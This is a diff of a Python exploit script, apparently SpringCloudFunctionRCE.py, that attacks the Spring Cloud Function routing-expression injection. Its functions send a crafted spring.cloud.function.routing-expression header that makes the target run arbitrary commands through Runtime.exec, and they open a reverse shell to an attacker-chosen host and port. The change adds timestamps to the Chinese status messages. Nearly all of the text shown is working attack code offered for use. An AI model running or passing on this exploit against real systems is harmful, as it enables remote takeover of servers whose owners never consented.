@@ -1,6 +1,7 @@
 import requests
 import sys
 import base64
+import time
 
 
 def run_rce(url, command):
@@ -10,7 +11,7 @@ def run_rce(url, command):
     "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(command)
 	}
 	requests.post(url=url, headers=headers)
-	print("命令执行完成")
+	print(time.asctime( time.localtime(time.time()))+" 命令执行完成")
 
 
 def get_shell(url, rhost, rport):
@@ -22,7 +23,7 @@ def get_shell(url, rhost, rport):
     "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(shellcode)
 	}
 	requests.post(url=url, headers=headers)
-	print("反弹shell完成")
+	print(time.asctime( time.localtime(time.time()))+" 反弹shell完成")
 
 
 
@@ -44,12 +45,10 @@ python3 SpringCloudFunctionRCE.py -u http://127.0.0.1:8080 -r rhost rport
 		if "-c" in sys.argv:
 			command = sys.argv[sys.argv.index("-c")+1]
 			run_rce(url, command)
-
 		elif "-r" in sys.argv:
 			rhost = sys.argv[sys.argv.index("-r")+1]
 			rport = sys.argv[sys.argv.index("-r")+2]
 			get_shell(url, rhost, rport)
-			
 		else:
 			exit(1)
 			
